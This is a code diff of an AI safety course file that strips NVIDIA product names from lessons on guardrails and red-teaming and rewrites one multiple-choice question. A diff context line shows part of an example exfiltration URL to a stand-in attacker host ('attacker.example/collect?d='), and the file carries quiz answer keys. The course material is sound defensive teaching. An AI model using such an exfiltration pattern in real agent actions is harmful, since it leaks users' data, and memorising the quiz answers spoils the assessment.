@@ -5,7 +5,7 @@ window.AGENTICED_COURSES = window.AGENTICED_COURSES || {};
 window.AGENTICED_COURSES.advanced = {
   title: "AI Safety & Governance — Specialty",
   intro: "An advanced course on making agentic AI systems safe, secure, fair, and accountable. It covers alignment and specification failures, threat modeling with the OWASP Top 10 for LLM Applications, prompt injection and agent security, guardrail engineering, bias and privacy, oversight by design, red-teaming, incident response, and governance frameworks including the NIST AI RMF, ISO/IEC 42001, and the EU AI Act.",
-  alignedWith: "Draws on the safety, ethics, and compliance and human-AI oversight domains of the NVIDIA-Certified Professional: Agentic AI blueprint, the OWASP Top 10 for LLM Applications, MITRE ATLAS, the NIST AI Risk Management Framework, ISO/IEC 42001, and the EU AI Act. AgenticEd is not affiliated with any of these organizations. This course is educational and is not legal advice.",
+  alignedWith: "Draws on the OWASP Top 10 for LLM Applications, MITRE ATLAS, the NIST AI Risk Management Framework, ISO/IEC 42001, and the EU AI Act. AgenticEd is not affiliated with any of these organizations. This course is educational and is not legal advice.",
   modules: [
     {
       id: "alignment",
@@ -248,7 +248,7 @@ https://attacker.example/collect?d=...</code></pre>`},
       domain: "Safety controls",
       objectives: [
         "Design guardrails across input, retrieval, dialog, execution, and output",
-        "Explain how programmable rails and safety classifiers work, including NVIDIA NeMo Guardrails",
+        "Explain how programmable rail frameworks and safety classifiers work",
         "Balance safety against over-refusal and latency",
         "Test and maintain guardrails over time"
       ],
@@ -266,9 +266,9 @@ https://attacker.example/collect?d=...</code></pre>`},
         {h: "Implementation approaches", html: `
 <ul>
 <li><b>Deterministic rules</b>: regex, allow/deny lists, schema validation, limits. Fast, predictable, auditable — use wherever a rule can be written.</li>
-<li><b>Classifier models</b>: small models trained to detect unsafe content, jailbreaks, or PII (e.g., Llama Guard, NVIDIA NemoGuard content-safety and jailbreak-detection models, Presidio for PII). Fast and specialized.</li>
+<li><b>Classifier models</b>: small models trained to detect unsafe content, jailbreaks, or PII (e.g., Llama Guard for content safety, Presidio for PII). Fast and specialized.</li>
 <li><b>LLM-based checks</b>: a model judges groundedness or policy compliance. Flexible but slower, costlier, and itself attackable.</li>
-<li><b>Programmable rail frameworks</b>: <b>NVIDIA NeMo Guardrails</b> lets you define input, output, dialog, retrieval, and execution rails in configuration (including its Colang language for dialog flows) and plug in classifiers and checks around any LLM.</li>
+<li><b>Programmable rail frameworks</b>: open-source guardrail libraries let you define input, output, dialog, retrieval, and execution rails in configuration and plug classifiers and checks in around any LLM, so safety logic lives in one versioned, testable place instead of being scattered through application code.</li>
 </ul>`},
         {h: "Calibrating guardrails", html: `
 <p>Guardrails fail in two directions. <b>Under-blocking</b> lets harmful content or actions through. <b>Over-blocking</b> (over-refusal) rejects legitimate requests — a nurse asking about medication overdose thresholds, a security researcher asking about a vulnerability class — and pushes users to less safe tools. Measure both: maintain test sets of harmful inputs <i>and</i> legitimate borderline inputs, and track false-positive and false-negative rates.</p>
@@ -285,7 +285,7 @@ https://attacker.example/collect?d=...</code></pre>`},
       takeaways: [
         "Rails apply at input, retrieval, dialog, execution, and output.",
         "Prefer deterministic rules, then classifiers, then LLM-based checks.",
-        "NeMo Guardrails and safety classifiers implement programmable rails around any LLM.",
+        "Guardrail frameworks and safety classifiers implement programmable rails around any LLM.",
         "Measure both false negatives (harm through) and false positives (over-refusal).",
         "Guardrails reduce likelihood; architecture limits impact — use both."
       ],
@@ -302,9 +302,9 @@ https://attacker.example/collect?d=...</code></pre>`},
         {q:"A medical-information assistant refuses to answer a nurse's legitimate question about maximum safe dosages. What does this indicate?",
          opts:["Perfect safety","Over-refusal (false positive) that should be measured and tuned","Prompt injection","A retrieval failure"],
          a:1, why:"Blocking legitimate requests is a real cost; guardrails must be evaluated on borderline legitimate inputs too."},
-        {q:"What is NVIDIA NeMo Guardrails?",
-         opts:["A GPU","A toolkit for adding programmable input, output, dialog, retrieval, and execution rails around LLM applications","A fine-tuning dataset","A vector database"],
-         a:1, why:"NeMo Guardrails provides configurable rails, including Colang dialog flows, that wrap any LLM."},
+        {q:"What is the main benefit of using a programmable guardrail framework instead of scattering checks through application code?",
+         opts:["It makes the model larger","Safety rules live in one versioned, testable configuration that wraps any LLM","It removes the need for evaluation","It eliminates all prompt injection"],
+         a:1, why:"Centralized, versioned rails can be reviewed, tested in CI, and updated consistently — but they still reduce rather than eliminate risk."},
         {q:"An injection classifier catches 98% of attacks. What is the right conclusion?",
          opts:["The system is secure","It reduces likelihood, but architecture such as least privilege and approvals must still limit the impact of the 2% that get through","Remove other controls to save latency","Retrain the LLM"],
          a:1, why:"No detector is perfect; defense in depth assumes some attacks succeed and limits their consequences."}
@@ -496,7 +496,7 @@ https://attacker.example/collect?d=...</code></pre>`},
 <li><b>Reliability</b>: edge cases, ambiguous instructions, long tasks, tool failures, loops.</li>
 <li><b>Alignment</b>: specification gaming, sycophancy, deceptive or overconfident answers.</li>
 </ul>
-<p>Combine manual testing by people with diverse expertise (including domain experts and people from affected communities) with automated attack generation and scanning tools (for example NVIDIA garak, PyRIT, or promptfoo). Record every finding with reproduction steps, severity, and status; convert findings into regression tests; and retest after fixes and on every significant model or tool change.</p>`},
+<p>Combine manual testing by people with diverse expertise (including domain experts and people from affected communities) with automated attack generation and scanning tools (for example open-source tools such as PyRIT or promptfoo). Record every finding with reproduction steps, severity, and status; convert findings into regression tests; and retest after fixes and on every significant model or tool change.</p>`},
         {h: "Accountable incident response", html: `
 <p>When an AI system causes or nearly causes harm: <b>contain</b> (kill switch, disable the affected tool), <b>assess</b> who was affected and how, <b>investigate</b> root cause using traces, <b>remediate</b> and add regression tests, <b>notify</b> affected people and regulators where required, and hold a <b>blameless review</b>.</p>
 <p>Public communication should name the specific failure, explain why it happened, describe the fix, and state what affected people should do. Concealment and blaming "the AI" both erode trust and leave the cause in place. Share lessons where possible (e.g., the AI Incident Database collects public cases).</p>`},
